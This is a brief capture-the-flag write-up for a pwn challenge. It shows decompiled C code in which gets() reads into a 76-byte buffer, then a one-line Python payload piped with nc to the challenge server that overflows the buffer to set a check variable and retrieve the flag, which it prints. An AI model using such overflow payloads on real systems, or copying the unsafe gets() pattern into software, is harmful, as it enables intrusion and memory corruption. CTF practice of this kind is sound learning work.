# PWN F111 - Part 4

## Problem

We have to now get the flag stored on the remote server in flag.txt. The binary already reads this file for us. We just need to pass a check. Decompiled C code:

```c
...
char local_78 [76];
int local_2c;
FILE *local_28;
int local_1c;

local_1c = 7;
local_2c = 0;
printf("Enter your name!> ");
gets(local_78);
if (local_2c == 0x5a) {
    local_28 = fopen("flag.txt","r");
...
```

## Solution

This doesn't require a complicated exploit so we just send the required bytes to the server via python2 printing to stdout and piping this to the program.

```python2
python2 -c "print b'A'*76 + b'\x5a\x00\x00\x00\x00'" | nc 144.24.133.118 6004
```

## Flag

```
cruXcrypt{buff3r_0v3rfl0w_my_b3l0ved}
```
